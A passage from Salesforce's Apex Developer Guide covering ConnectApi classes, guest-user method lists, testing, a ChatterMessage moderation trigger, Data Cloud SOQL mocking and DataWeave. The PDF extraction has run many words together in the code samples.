getFeedElementsFromFeed(communityId,feedType,subjectId,recentCommentCount,
elementsPerBundle,density,pageParam,pageSize,sortParam,showInternalOnly,
filter,threadedCommentsCollapsed)
•
getFeedElementsFromFeed(communityId,feedType,subjectId,recentCommentCount,
elementsPerBundle,density,pageParam,pageSize,sortParam,showInternalOnly,
customFilter,threadedCommentsCollapsed)
SEE ALSO:
Apex Reference Guide: ChatterFavorites Class
Apex Reference Guide: ChatterFeeds Class
Apex Reference Guide: ConnectApi Output Classes
Apex Reference Guide: ConnectApi Input Classes
Accessing ConnectApi Data in Experience Cloud Sites
Many ConnectApi methods work within the context of a single Experience Cloud site.
448
Using Salesforce Features with ApexApex Developer Guide

Many ConnectApi methods include communityId as the first argument. If you don’t have digital experiences enabled, use
internal or null for this argument.
If you have digital experiences enabled, the communityId argument specifies whether to execute a method in the context of the
default Experience Cloud site (by specifying internal or null) or in the context of a specific site (by specifying an ID). Any entity,
such as a comment or a feed item, referred to by other arguments in the method must be in the specified site. The ID is included in URLs
returned in the output.
Some ConnectApi methods include siteId as an argument. Unlike communityId, if you don’t have digital experiences
enabled, you can’t use these methods. The site ID is included in URLs returned in the output.
Most URLs returned in ConnectApi output objects are Connect REST API resources.
If you specify an ID, URLs returned in the output use the following format:
/connect/communities/communityId/resource
If you specify internal, URLs returned in the output use the same format:
/connect/communities/internal/resource
If you specify null, URLs returned in the output use one of these formats:
/chatter/resource
/connect/resource
Methods Available to Experience Cloud Guest Users
If your Experience Cloud site allows access without logging in, guest users have access to many Apex methods. These methods return
information the guest user has access to.
All overloads of these methods are available to guest users.
Important:  If an overload of a method listed here indicates that Chatter is required, you must also enable public access to your
Experience Cloud site to make the method available to guest users. If you don’t enable public access, data retrieved by methods
that require Chatter doesn’t load correctly on public site pages.
•
Announcements methods:
–
getAnnouncements()
•
ChatterFeeds methods:
–
getComment()
–
getCommentInContext()
–
getCommentsForFeedElement()
–
getExtensions()
–
getFeed()
–
getFeedElement()
–
getFeedElementBatch()
–
getFeedElementPoll()
–
getFeedElementsFromFeed()
–
getFeedElementsUpdatedSince()
–
getFeedWithFeedElements()
449
Using Salesforce Features with ApexApex Developer Guide

–
getLike()
–
getLikesForComment()
–
getLikesForFeedElement()
–
getLinkMetadata()
–
getPinnedFeedElementsFromFeed()
–
getRelatedPosts()
–
getThreadsForFeedComment()
–
getVotesForComment()
–
getVotesForFeedElement()
–
searchFeedElements()
–
searchFeedElementsInFeed()
–
updatePinnedFeedElements()
•
ChatterGroups methods:
–
getGroup()
–
getGroups()
–
getMembers()
–
searchGroups()
•
ChatterUsers methods:
–
getFollowers()
–
getFollowings()
–
getReputation()
–
getUser()
–
getUserBatch()
–
getUserGroups()
–
getUsers()
–
searchUserGroupDetails()
–
searchUsers()
•
CommerceCart methods:
–
addItemsToCart()
–
addItemToCart()
–
applyCartCoupon()
–
calculateCart()
–
cloneCart()
–
copyCartToWishlist()
–
createCart()
–
deleteCart()
–
deleteCartCoupon()
–
deleteCartItem()
–
deleteInventoryReservation() (developer preview)
450
Using Salesforce Features with ApexApex Developer Guide

–
evaluateShipping()
–
evaluateTaxes()
–
getCartCoupons()
–
getCartItems()
–
getCartCompactSummary()
–
getCartSummary()
–
getOrCreateActiveCartSummary()
–
makeCartPrimary()
–
setCartMessagesVisibility()
–
updateCartItem()
–
upsertInventoryReservation() (developer preview)
•
CommerceCatalog methods:
–
getCategoryMenuItems()
–
getProduct()
–
getProducts()
–
getProductCategory()
–
getProductCategoryChildren()
–
getProductCategoryPath()
–
getProductChildCollection()
•
CommercePromotions methods:
–
decreaseRedemption()
–
evaluate()
–
increaseRedemption()
•
CommerceSearch methods:
–
getSortRules()
–
getSuggestions()
–
searchProducts()
•
CommerceStorePricing methods:
–
getProductPrice()
–
getProductPrices()
•
Communities methods:
–
getCommunity()
•
EmployeeProfiles methods:
–
getPhoto()
•
ExtendedCommerceDelivery methods:
–
estimateDeliveryDate()
•
Knowledge methods:
451
Using Salesforce Features with ApexApex Developer Guide

getTopViewedArticlesForTopic()
–
–
getTrendingArticles()
–
getTrendingArticlesForTopic()
•
ManagedContent methods:
–
getAllContent()
–
getAllDeliveryChannels()
–
getAllManagedContent()
–
getContentByContentKeys()
–
getContentByIds()
–
getManagedContentByContentKeys()
–
getManagedContentByIds()
–
getManagedContentByTopics()
–
getManagedContentByTopicsAndContentKeys()
–
getManagedContentByTopicsAndIds()
•
ManagedContentDelivery methods:
–
getChannel()
–
getChannels()
–
getCollectionItemsForChannel()
–
getCollectionItemsForSite()
–
getManagedContentChannel()
–
getManagedContentForChannel()
–
getManagedContentForSite()
–
getManagedContentsForChannel()
–
getManagedContentsForSite()
•
ManagedTopics methods:
–
getManagedTopic()
–
getManagedTopics()
•
MarketingIntegration methods:
–
submitForm()
•
NavigationMenu methods:
–
getCommunityNavigationMenu()
•
NextBestActions methods:
–
executeStrategy()
–
setRecommendationReaction()
•
Personalization methods:
–
getAudience()
–
getAudienceBatch()
452
Using Salesforce Features with ApexApex Developer Guide

–
getAudiences()
–
getTarget()
–
getTargetBatch()
–
getTargets()
•
Recommendations methods:
–
getRecommendationsForUser()
Note:  Only article and file recommendations are available to guest users.
•
Search methods.
–
answer()
–
find()
–
findAndGroup()
•
Sites methods:
–
searchSite()
•
Topics methods:
–
getGroupsRecentlyTalkingAboutTopic()
–
getRecentlyTalkingAboutTopicsForGroup()
–
getRecentlyTalkingAboutTopicsForUser()
–
getRelatedTopics()
–
getTopic()
–
getTopics()
–
getTrendingTopics()
•
UserProfiles methods:
–
getPhoto()
SEE ALSO:
Salesforce Help: Give Secure Access to Unauthenticated Users with the Guest User Profile
Supported Validations for DBT Segments
When creating or updating a segment, the ConnectApi.CdpSegmentInput class is subject to some SQL validations.
You can create a segment using the createSegment(input) method with the ConnectApi.CdpSegmentInput class.
Similarly, you can update a segment using the updateSegment(segmentApiName,input) method with the same input
class. The ConnectApi.CdpSegmentDbtModelInput input class, which is nested in the ConnectApi.CdpSegmentInput
class, provides validation for the SQL.
The sql property of the ConnectApi.CdpSegmentDbtModelInput is subject to these validations.
453
Using Salesforce Features with ApexApex Developer Guide

Using ConnectApi Input and Output Classes
Some classes in the ConnectApi namespace contain static methods that access Connect REST API data. The ConnectApi
namespace also contains input classes to pass as parameters and output classes that calls to the static methods return.
ConnectApi methods take either simple or complex types. Simple types are primitive Apex data like integers and strings. Complex
types are ConnectApi input objects.
The successful execution of a ConnectApi method can return an output object from the ConnectApi namespace. ConnectApi
output objects can be made up of other output objects. For example, the ConnectApi.ActorWithId output object contains
properties such as id and url, which contain primitive data types. It also contains a mySubscription property, which contains
a ConnectApi.Reference object.
Note:  All Salesforce IDs in ConnectApi output objects are 18 character IDs. Input objects can use 15 character IDs or 18
character IDs.
SEE ALSO:
Apex Reference Guide: ConnectApi Input Classes
Apex Reference Guide: ConnectApi Output Classes
Understanding Limits for ConnectApi Classes
Limits for methods in the ConnectApi namespace are different than the limits for other Apex classes.
For classes in the ConnectApi namespace, every write operation costs one DML statement against the Apex governor limit.
ConnectApi method calls are also subject to rate limiting. ConnectApi rate limits match Connect REST API rate limits. Both have
a per user, per namespace, per hour rate limit. When you exceed the rate limit, a ConnectApi.RateLimitException is thrown.
Your Apex code must catch and handle this exception.
For migrated orgs and orgs created in Summer ’24 and later, only ConnectApi method calls that require Chatter are subject to the
per user, per namespace, per hour rate limit. The documentation for every ConnectApi method indicates whether Chatter is required.
ConnectApi method calls that don’t require Chatter count toward the Salesforce Platform total API request allocations, which are
per org and span a 24-hour period.
When testing code, a call to the Apex Test.startTest method starts a new rate limit count. A call to the Test.stopTest
method sets your rate limit count to the value it was before you called Test.startTest.
Packaging ConnectApi Classes
If you include ConnectApi classes in a package, be aware of Chatter dependencies.
If a ConnectApi class has a dependency on Chatter, the code can be compiled and installed in orgs that don’t have Chatter enabled.
However, if Chatter isn’t enabled, the code throws an error at run time.
System.NoAccessException:InsufficientPrivileges:Thisfeatureis not currentlyenabled
for thisuser.
In its reference documentation, every ConnectApi method indicates whether or not it supports Chatter.
SEE ALSO:
Distributing Apex Using Managed Packages
454
Using Salesforce Features with ApexApex Developer Guide

Serializing and Deserializing ConnectApi Objects
When ConnectApi output objects are serialized into JSON, the structure is similar to the JSON returned from Connect REST API.
When ConnectApi input objects are deserialized from JSON, the format is also similar to Connect REST API.
Connect in Apex supports serialization and deserialization in these Apex contexts.
•
JSON and JSONParser classes—serialize Connect in Apex outputs to JSON and deserialize Connect in Apex inputs from JSON.
•
Apex REST with @RestResource—serialize Connect in Apex outputs to JSON as return values and deserialize Connect in Apex
inputs from JSON as parameters.
•
JavaScript Remoting with @RemoteAction—serialize Connect in Apex outputs to JSON as return values and deserialize Connect
in Apex inputs from JSON as parameters.
Connect in Apex follows these rules for serialization and deserialization.
•
Only output objects can be serialized.
•
Only top-level input objects can be deserialized.
•
Enum values and exceptions cannot be serialized or deserialized.
ConnectApi Versioning and Equality Checking
Versioning in ConnectApi classes follows specific rules that are different than the rules for other Apex classes.
Versioning for ConnectApi classes follows these rules.
•
A ConnectApi method call executes in the context of the version of the class that contains the method call. The use of version
is analogous to the /vXX.X section of a Connect REST API URL.
•
Each ConnectApi output object exposes a getBuildVersion method. This method returns the version under which the
method that created the output object was invoked.
•
When interacting with input objects, Apex can access only properties supported by the version of the enclosing Apex class.
•
Input objects passed to a ConnectApi method may contain only non-null properties that are supported by the version of the
Apex class executing the method. If the input object contains version-inappropriate properties, an exception is thrown.
•
The output of the toString method only returns properties that are supported in the version of the code interacting with the
object. For output objects, the returned properties must also be supported in the build version.
•
Apex REST, JSON.serialize, and @RemoteAction serialization include only version-appropriate properties.
•
Apex REST, JSON.deserialize, and @RemoteAction deserialization reject properties that are version-inappropriate.
•
Enums are not versioned. Enum values are returned in all API versions. Clients should handle values they don't understand gracefully.
Equality checking for ConnectApi classes follows these rules.
•
Input objects—properties are compared.
•
Output objects—properties and build versions are compared. For example, if two objects have the same properties with the same
values but have different build versions, the objects are not equal. To get the build version, call getBuildVersion.
Casting ConnectApi Objects
It may be useful to downcast some ConnectApi output objects to a more specific type.
This technique is especially useful for message segments, feed item capabilities, and record fields. Message segments in a feed item are
typed as ConnectApi.MessageSegment. Feed item capabilities are typed as ConnectApi.FeedItemCapability.
Record fields are typed as ConnectApi.AbstractRecordField. These classes are all abstract and have several concrete
subclasses. At runtime you can use instanceof to check the concrete types of these objects and then safely proceed with the
corresponding downcast. When you downcast, you must have a default case that handles unknown subclasses.
455
Using Salesforce Features with ApexApex Developer Guide

The following example downcasts a ConnectApi.MessageSegment to a ConnectApi.MentionSegment:
if(segmentinstanceofConnectApi.MentionSegment){
ConnectApi.MentionSegment= (ConnectApi.MentionSegment)segment;
}
Important:  The composition of a feed can change between releases. Write your code to handle instances of unknown subclasses.
SEE ALSO:
Apex Reference Guide: ChatterFeeds Class
Apex Reference Guide: ConnectApi.FeedElementCapabilities
Apex Reference Guide: ConnectApi.MessageSegment
Apex Reference Guide: ConnectApi.AbstractRecordView
Wildcards
Use wildcard characters to match text patterns in Connect REST API and Connect in Apex searches.
A common use for wildcards is searching a feed. Pass a search string and wildcards in the q parameter. This example is a Connect REST
API request:
/chatter/feed-elements?q=chat*
This example is a Connect in Apex method call:
ConnectApi.ChatterFeeds.searchFeedElements(null, 'chat*');
You can specify the following wildcard characters to match text patterns in your search:
DescriptionWildcard
Asterisks match zero or more characters at the middle or end of your search term. For example, a search for john*
finds items that start with john, such as, john, johnson, or johnny. A search for mi* meyers finds items with mike
meyers or michael meyers.
*
If you are searching for a literal asterisk in a word or phrase, then escape the asterisk (precede it with the \ character).
Question marks match only one character in the middle or end of your search term. For example, a search for jo?n
finds items with the term john or joan but not jon or johan. You can't use a ? in a lookup search.
?
When using wildcards, consider the following notes:
•
The more focused your wildcard search, the faster the search results are returned, and the more likely the results will reflect your
intention. For example, to search for all occurrences of the word prospect (or prospects, the plural form), it is more efficient
to specify prospect* in the search string than to specify a less restrictive wildcard search (such as prosp*) that could return
extraneous matches (such as prosperity).
•
Tailor your searches to find all variations of a word. For example, to find property and properties, you would specify
propert*.
•
Punctuation is indexed. To find * or ? inside a phrase, you must enclose your search string in quotation marks and you must escape
the special character. For example, "whereare you\?" finds the phrase whereare you?. The escape character (\) is
required in order for this search to work correctly.
456
Using Salesforce Features with ApexApex Developer Guide

Testing ConnectApi Code
Like all Apex code, Connect in Apex code requires test coverage.
Connect in Apex methods don’t run in system mode, they run in the context of the current user (also called the context user). The methods
have access to whatever the context user has access to. Connect in Apex doesn’t support the runAs system method.
Most Connect in Apex methods require access to real org data, and fail unless used in test methods marked
@IsTest(SeeAllData=true).
However, some Connect in Apex methods, such as getFeedElementsFromFeed, are not permitted to access org data in tests
and must be used with special test methods that register outputs to be returned in a test context. If a method requires a setTest
method, the requirement is stated in the method’s “Usage” section.
A test method name is the regular method name with a setTest prefix. The test method signature (combination of parameters)
matches a signature of the regular method. For example, if the regular method has three overloads, the test method has three overloads.
Using Connect in Apex test methods is similar to testing web services in Apex. First, build the data you expect the method to return. To
build data, create output objects and set their properties. To create objects, you can use no-argument constructors for any non-abstract
output classes. If you’re testing binary input parameters, use the same instance for creating and executing data.
After you build the data, call the test method to register the data. Call the test method that has the same signature as the regular method
you’re testing.
After you register the test data, run the regular method. When you run the regular method, the registered data is returned.
Important:  Use the test method signature that matches the regular method signature. If data wasn't registered with the matching
set of parameters when you call the regular method, you receive an exception.
This example shows a test that constructs an ConnectApi.FeedElementPage and registers it to be returned when
getFeedElementsFromFeed is called with a particular combination of parameters.
globalclassNewsFeedClass{
globalstaticIntegergetNewsFeedCount(){
ConnectApi.FeedElementPageelements=
ConnectApi.ChatterFeeds.getFeedElementsFromFeed(null,
ConnectApi.FeedType.News,'me');
returnelements.elements.size();
}
}
@isTest
privateclassNewsFeedClassTest{
@IsTest
staticvoiddoTest(){
// Builda simplefeeditem
ConnectApi.FeedElementPagetestPage= new ConnectApi.FeedElementPage();
List<ConnectApi.FeedItem>testItemList= new List<ConnectApi.FeedItem>();
testItemList.add(new ConnectApi.FeedItem());
testItemList.add(new ConnectApi.FeedItem());
testPage.elements= testItemList;
// Set the testdata
ConnectApi.ChatterFeeds.setTestGetFeedElementsFromFeed(null,
ConnectApi.FeedType.News,'me', testPage);
// The methodreturnsthe testpage,whichwe knowhas two itemsin it.
Test.startTest();
457
Using Salesforce Features with ApexApex Developer Guide

System.assertEquals(2,NewsFeedClass.getNewsFeedCount());
Test.stopTest();
}
}
SEE ALSO:
Testing Apex
Differences Between ConnectApi Classes and Other Apex Classes
Note these additional differences between ConnectApi classes and other Apex classes.
System mode and context user
Connect in Apex methods don’t run in system mode, they run in the context of the current user (also called the context user). The
methods have access to whatever the context user has access to. Connect in Apex doesn’t support the runAs system method.
When a method takes a subjectId argument, often that subject must be the context user. In these cases, you can use the string
me to specify the context user instead of an ID.
Connect in Apex isn’t available to Automated Process users by default. Connect in Apex is available to these users:
•
Chatter-only users
•
Guest users
•
Portal users
•
Standard users
withsharing and withoutsharing
Connect in Apex ignores the withsharing and withoutsharing keywords. Instead, the context user controls all security,
field level sharing, and visibility. For example, if the context user is a member of a private group, ConnectApi classes can post
to that group. If the context user is not a member of a private group, the code can’t see the feed items for that group and can’t post
to the group.
Asynchronous operations
Some Connect in Apex operations are asynchronous, that is, they don’t occur immediately. For example, if your code adds a feed
item for a user, it isn’t immediately available in the news feed. Another example: when you add a photo, it’s not available immediately.
For testing, if you add a photo, you can’t retrieve it immediately.
No XML support in Apex REST
Apex REST doesn’t support XML serialization and deserialization of Connect in Apex objects. Apex REST does support JSON serialization
and deserialization of Connect in Apex objects.
Empty log entries
Information about Connect in Apex objects doesn’t appear in VARIABLE_ASSIGNMENT log events.
No Apex SOAP web services support
Connect in Apex objects can’t be used in Apex SOAP web services indicated with the keyword webservice.
458
Using Salesforce Features with ApexApex Developer Guide

Moderate Chatter Private Messages with Triggers
EDITIONS
Available in: Salesforce
Classic
Available in: Enterprise,
Performance, Unlimited,
and Developer Editions
USER PERMISSIONS
To save Apex triggers for
ChatterMessage:
•Author Apex
AND
Manage Chatter
Messages and Direct
Messages
Write a trigger for ChatterMessage to automate the moderation of private messages in an org or
Experience Cloud site. Use triggers to ensure that messages conform to your company’s messaging
policies and don’t contain blocklisted words.
Write an Apex before insert trigger to review the private message body and information about the
sender. You can add validation messages to the record or the Body field, which causes the message
to fail and an error to be returned to the user.
Although you can create an after insert trigger, ChatterMessage is not updatable, and consequently
any after insert trigger that modifies ChatterMessage will fail at run time with an appropriate error
message.
To create a trigger for private messages from Setup, enter ChatterMessageTriggers in
the QuickFind box, then select ChatterMessage Triggers. Alternatively, you can create a
trigger from the Developer Console by clicking File > New > Apex Trigger and selecting
ChatterMessage from the sObject drop-down list.
This table lists the fields that are exposed on ChatterMessage.
Table 9: Available Fields in ChatterMessage
DescriptionApex Data TypeField
Unique identifier for the Chatter messageIDId
Body of the Chatter message as posted by the
sender
StringBody
User ID of the senderIDSenderId
Date and time that the message was sentDateTimeSentDate
Network (site) in which the message was sent.
This field is visible only if digital experiences is
enabled and Private Messages is enabled in at
least one site.
IDSendingNetworkId
This example shows a before insert trigger on ChatterMessage that is used to review each new message. This trigger calls a class method,
moderator.review(), to review each new message before it is inserted.
triggerPrivateMessageModerationTriggeron ChatterMessage(beforeinsert) {
ChatterMessage[]messages= Trigger.new;
// Instantiatethe MessageModeratorusingthe factorymethod
MessageModeratormoderator= MessageModerator.getInstance();
for (ChatterMessagecurrentMessage: messages){
moderator.review(currentMessage);
}
}
If a message violates your policy, for example when the message body contains blocklisted words, you can prevent the message from
being sent by calling the Apex addError method. You can call addError to add a custom error message on a field or on the
459
Using Salesforce Features with ApexApex Developer Guide

entire message. The following snippet shows a portion of the reviewContent method that adds an error to the message Body
field.
if (proposedMsg.contains(nextBlockListedWord)){
theMessage.Body.addError(
'Thismessagedoesnot conformto the acceptableuse policy');
System.debug('moderationflaggedmessagewithword:'
+ nextBlockListedWord);
problemsFound=true;
break;
}
The following is the full MessageModerator class, which contains methods for reviewing the sender and the content of messages.
Part of the code in this class has been deleted for brevity.
publicclassMessageModerator{
privateStaticList<String> blocklistedWords=null;
privateStaticMessageModeratorinstance=null;
/**
Overallreviewincludescheckingthe contentof the message,
and validatingthatthe senderis allowedto sendmessages.
**/
publicvoidreview(ChatterMessagetheMessage){
reviewContent(theMessage);
reviewSender(theMessage);
}
/**
Thismethodis usedto reviewthe contentof the message.If the content
is unacceptable,fieldlevelerror(s)are added.
**/
publicvoidreviewContent(ChatterMessagetheMessage){
// Forcingto lowercasefor matching
StringproposedMsg=theMessage.Body.toLowerCase();
booleanproblemsFound=false; // Assumeit'sacceptable
// Iteratethroughthe blocklistlookingfor matches
for (StringnextBlockListedWord: blocklistedWords){
if (proposedMsg.contains(nextBlockListedWord)){
theMessage.Body.addError(
'Thismessagedoesnot conformto the acceptableuse policy');
System.debug('moderationflaggedmessagewithword:'
+ nextBlockListedWord);
problemsFound=true;
break;
}
}
// For demopurposes,we'regoingto add a "sealof approval"to the
// messagebodywhichis visible.
if (!problemsFound){
theMessage.Body= theMessage.Body+
' *** approved,meetsconductguidelines';
}
460
Using Salesforce Features with ApexApex Developer Guide

}
/**
Is the senderallowedto sendmessagesin thiscontext?
-- Moderators-- alwaysallowedto send
-- InternalMembers-- alwaysallowedto send
-- SiteMembers-- in generalonlyallowedto sendif theyhave
a sufficientReputation
-- SiteMembers-- withinsufficientreputationmay messagethe
moderator(s)
**/
publicvoidreviewSender(ChatterMessagetheMessage){
// Are we in a SiteContext?
booleanisSiteContext= (theMessage.SendingNetworkId!= null);
// Get the User
UsersendingUser= [SELECTId, Name,UserType,IsPortalEnabled
FROMUserwhereId = :theMessage.SenderId];
// ...
}
/**
Enforcea singletonpatternto improveperformance
**/
publicstaticMessageModeratorgetInstance(){
if (instance==null) {
instance= new MessageModerator();
}
returninstance;
}
/**
Defaultcontructoris privateto preventothersfrominstantiatingthisclass
withoutusingthe factory.
Initializesthe staticmembers.
**/
privateMessageModerator(){
initializeBlockList();
}
/**
Helpermethodthatdoesthe "heavylifting"to loadup the dictionaries
fromthe database.
Shouldonlyrun onceto initializethe staticmemberwhichis usedfor
subsequentvalidations.
**/
privatevoidinitializeBlockList(){
if (blocklistedWords==null) {
// Filllistof blocklistedwords
// ...
}
}
}
461
Using Salesforce Features with ApexApex Developer Guide

Data Cloud In Apex
You can use Apex with Data Cloud objects, with constraints and considerations that are detailed in this topic . Further, you can mock
SOQL query responses for Data Cloud data model objects (DMOs) in Apex testing by using SOQL stub methods and a test class.
Using SOQL in Apex with Data Cloud Objects
Static SOQL is supported with Data Cloud data model objects (DMOs) as a more direct alternative to using either dynamic SOQL or
ConnectAPI. Additionally, SOQL queries against DMOs using Apex Database.QueryLocator or in FOR loops is supported in API
version 61.0 and later. In versions earlier than 61.0, only the first 201 records are returned. Batch Apex is blocked against DMOs when
using QueryLocators, but is supported when using Iterable.
Warning:  Running SOQL queries against DMOs can result in Data Services credits being consumed from your Data Cloud
subscription. For more information on how usage is billed, see Data Cloud Billable Usage Types. Use caution when using FOR loops,
query locators, recursion, or any mechanism that can result in multiple queries to Data Cloud.
A static SOQL query against Data Cloud from Apex is considered a callout and is subject to the same restrictions as HTTP callouts from
Apex. For example, if there is pending DML, this sample code can result in an unexpected exception with this message:
UnexpectedException:A calloutwas unsuccessfulbecauseof pendinguncommittedwork
relatedto a process,flow,or Apexoperation.Commitor rollbackthe work,and then
try again.
insertnew Account(Name='Test');
List<ssot_Account_dlm>dmo1= [SelectId fromssot_Account_dlm];
Security Considerations
You must consider field- and record-level access when using Apex with Data Cloud data model objects (DMOs). DMOs in all data spaces
are accessible from Apex in system mode, even when a permission set for the data space isn’t explicitly assigned. Read-only object-level
access checks are supported if the user has access to the data space. There’s currently no support for field-level security or for record-level
access control. Apex features, such as WITH USER_MODE, WITH SECURITY_ENFORCED, describe calls, and
Security.stripInaccessible(), can check only object-level access for DMOs.
Starting with API version 61.0, you can get information on a specific DMO using SObjectType.getDescribe(). There’s no
field-level security to be enforced because all fields on DMOs that are accessed by field describes and security model checks are read
only. You can’t use Schema.getGlobalDescribe() to discover exposed DMOs. Instead, use the
Schema.describeSObjects(List<String>) method with the known DMO API names.
This example uses static SOQL with the UnifiedIndividual__dlm Data Cloud object.
//StaticSOQLexample
List<UnifiedIndividual__dlm>unifiedIndividuals= [
SELECT
Id,
ssot__FirstName__c,
ssot__LastName__c,
ssot__Email__c,
ssot__SkyMilesBalance__c,
ssot__MedallionStatus__c
FROMUnifiedIndividual__dlm
WHEREssot__CompanyId__c= :companyId
];
462
Using Salesforce Features with ApexApex Developer Guide

Mock SOQL Tests for Data Cloud Data Model Objects
You can mock SOQL query responses for Data Cloud data model objects (DMOs) in Apex testing by using the new SOQL stub methods
and a new test class. Use static or dynamic SOQL queries against DMOs and return mock records in a testing context.
Mock SOQL Tests for Data Cloud Data Model Objects
You can mock SOQL query responses for Data Cloud data model objects (DMOs) in Apex testing by using the new SOQL stub methods
and a new test class. Use static or dynamic SOQL queries against DMOs and return mock records in a testing context.
Create mock test classes by extending the new System.SoqlStubProvider class and overriding the handleSoqlQuery()
class method. Create DMO instances using either Test.createStubQueryRow() or Test.createStubQueryRows().
Register the mock provider in the test using Test.createSoqlStub() and execute the test code.
Note:  Apex governor limits apply to the stubbed records.
The SOQL query must be against a DMO or an external object, either directly with a FROM clause or via a subquery. If you query against
a stubbed object type that doesn’t include a DMO or an external object, the error Stubbedqueryinvocationscan'tbe
usedwithouta participatingquerystubset. is thrown.
These features are not allowed within a stub implementation:
•
SOQL
•
SOSL
•
Callouts
•
Future methods
•
Queueable Jobs
•
Batch Jobs
•
DML
•
Platform Events
This example shows a mock test class for the SkyMilesForBusinessOptInController class.
@IsTest
publicclassSkyMilesForBusinessOptInController_Test{
@IsTest
publicstaticvoidmockSoql(){
SoqlStubProviderstub= new UnifiedIndividualSoqlStub();
Test.createSoqlStub(UnifiedIndividual__dlm.sObjectType,stub);
Assert.isTrue(Test.isSoqlStubDefined(UnifiedIndividual__dlm.sObjectType));
Test.startTest();
stringcompanyId= 'SampleCompanyId';
// PerformsSOQLqueryagainstDataModelObject
List<SkyMilesMember>members=
SkyMilesForBusinessOptInController.getSkyMilesProfilesFromDataCloud(companyId);
Test.stopTest();
Assert.areEqual(1,members.size());
463
Using Salesforce Features with ApexApex Developer Guide

SkyMilesMembermember= members[0];
Assert.areEqual(companyId,member.CompanyId);
Assert.areEqual(5000,member.SkyMilesBalance);
}
classUnifiedIndividualSoqlStubextendsSoqlStubProvider{
publicoverrideList<sObject>handleSoqlQuery(sObjectTypesot,stringstubbedQuery,
Map<string,object>bindVars){
Assert.areEqual(UnifiedIndividual__dlm.sObjectType,sot);
// Stubassumesthatthe SOQLqueryis searchingfor a singlerecordby company
id
stringcompanyId= 'Default';
if(bindVars.containsKey('tmpVar1')){
companyId= (string)bindVars.get('tmpVar1');
}
UnifiedIndividual__dlmdmo = (UnifiedIndividual__dlm)Test.createStubQueryRow(
sot,
new Map<string,object>{
'ssot__FirstName__c'=> 'Codey',
'ssot__LastName__c'=> 'Bear',
'ssot__Email__c'=> 'developer@salesforce.com',
'ssot__SkyMilesBalance__c'=> 5000,
'ssot__MedallionStatus__c'=> 'Gold',
'ssot__CompanyId__c'=> companyId
}
);
returnnew List<sObject>{ dmo };
}
}
}
publicwithsharingclassSkyMilesForBusinessOptInController{
publicstaticList<SkyMilesMember>getSkyMilesProfilesFromDataCloud(StringcompanyId)
{
List<UnifiedIndividual__dlm>unifiedIndividuals= [
SELECT
Id,
ssot__FirstName__c,
ssot__LastName__c,
ssot__Email__c,
ssot__SkyMilesBalance__c,
ssot__MedallionStatus__c,
ssot__CompanyId__c
FROMUnifiedIndividual__dlm
WHEREssot__CompanyId__c= :companyId
];
List<SkyMilesMember>skyMilesMembers= new List<SkyMilesMember>();
464
Using Salesforce Features with ApexApex Developer Guide

for (UnifiedIndividual__dlmindividual: unifiedIndividuals){
skyMilesMembers.add(
new SkyMilesMember(
individual.Id,
individual.ssot__FirstName__c,
individual.ssot__LastName__c,
individual.ssot__Email__c,
individual.ssot__SkyMilesBalance__c,
individual.ssot__MedallionStatus__c,
individual.ssot__CompanyId__c
)
);
}
returnskyMilesMembers;
}
}
SEE ALSO:
Apex Reference Guide: SoqlStubProvider Class
DataWeave in Apex
DataWeave in Apex uses the Mulesoft DataWeave library to read and parse data from one format, transform it, and export it in a different
format. You can create DataWeave scripts as metadata and invoke them directly from Apex. Like Apex, DataWeave scripts are run within
Salesforce application servers, enforcing the same heap and CPU limits on the executing code.
Enterprise applications often require transformation of data between formats such as CSV, JSON, XML, and Apex objects. DataWeave in
Apex complements native Apex support for JSON and XML processing, and makes data transformation easier to code, more scalable,
and efficient. Apex developers can focus more on solving business problems and less on addressing the specifics of file formats.
DataWeave is the MuleSoft expression language for accessing, parsing, and transforming data that travels through a Mule application.
For detailed information, see  DataWeave Overview.
Note:  You don’t have to be a MuleSoft customer or have any specific Salesforce license to use DataWeave in Apex.
The following are some use-cases for DataWeave in Apex.
•
Serializing Apex objects with custom date formats
•
Serializing and deserializing JSON with Apex reserved keywords
•
Performing custom transformations like removing or adding namespaces or removing __c suffixes
•
Parsing and transforming RFC 4180-compliant CSV (Comma-Separated Values) data
You can create a listview for DataWeave resources in your org and view deployed DataWeave scripts within your namespace. From
Setup, in the Quick Find box, enter DataWeave, and then select DataWeave Resources. Select the fields that you want to monitor,
such as the DataWeave Resource ID, Name, Namespace Prefix, and API Version.
Implementing DataWeave in Apex
Create DataWeave scripts as metadata and invoke them directly from Apex. Use class methods and exceptions in the DataWeave
namespace to load and execute the scripts.
465
Using Salesforce Features with ApexApex Developer Guide

Examples of DataWeave in Apex
Here are code samples that demonstrate DataWeave in Apex.
Limitations of DataWeave in Apex
DataWeave in Apex has these limitations.
SEE ALSO:
Apex Reference Guide: DataWeave Namespace
Metadata API Developer Guide: DataWeaveResource
Salesforce DX Developer Guide: DataWeaveResource
Implementing DataWeave in Apex
Create DataWeave scripts as metadata and invoke them directly from Apex. Use class methods and exceptions in the DataWeave
namespace to load and execute the scripts.
DataWeave Namespace
The DataWeave namespace provides classes and methods to support the invocation of DataWeave scripts from Apex. The Script
class contains the createScript() method to load DataWeave scripts from .dwl metadata files that have been deployed to an
org. The resulting script can then be run with a payload using the execute() method to obtain script output in a
DataWeave.Result object. The Result class contains methods to retrieve script output using Script class methods. For
more information on these classes and methods, see DataWeave Namespace.
For every DataWeave script, an inner class of type DataWeaveScriptResource.ScriptName is generated. The inner class
extends the DataWeave.Script class. You can use the generated DataWeaveScriptResource.ScriptName class
instead of using the actual script name via the createScript() method. DataWeave scripts that are currently being referenced
via this inner class can't be deleted. To make the generated DataWeaveScriptResource class global, set the isGlobal field in the
DataWeaveResource metadata object.
<?xmlversion="1.0"encoding="UTF-8"?>
<DataWeaveResourcexmlns="http://soap.sforce.com/2006/04/metadata">
<apiVersion>58.0</apiVersion>
<isGlobal>true</isGlobal>
</DataWeaveResource>
The catchable System.DataWeaveScriptException exception is available for error handling. Runtime script exceptions that
occur within DataWeave are exposed to Apex with this exception type.
DataWeave scripts support logging using the log(string,value) function. Log messages that originate from DataWeave are
reflected in Apex debug logs as DATAWEAVE_USER_DEBUG events, under the Apex Code log category at the DEBUG log level.
Supporting Information
These tools support the development of DataWeave scripts.
•
DataWeave Interactive Learning is an online interactive playground that you can use to test your DataWeave scripts.
•
DataWeave 2.0 VSCode marketplace extension adds code highlighting and other feature support for editing DataWeave scripts.
Versioned Behavior Changes
These versions of DataWeave script syntax are supported in Apex.
466
Using Salesforce Features with ApexApex Developer Guide

•
API version 61.0 and earlier: DataWeave 2.5
•
API version 62.0: DataWeave 2.8
•
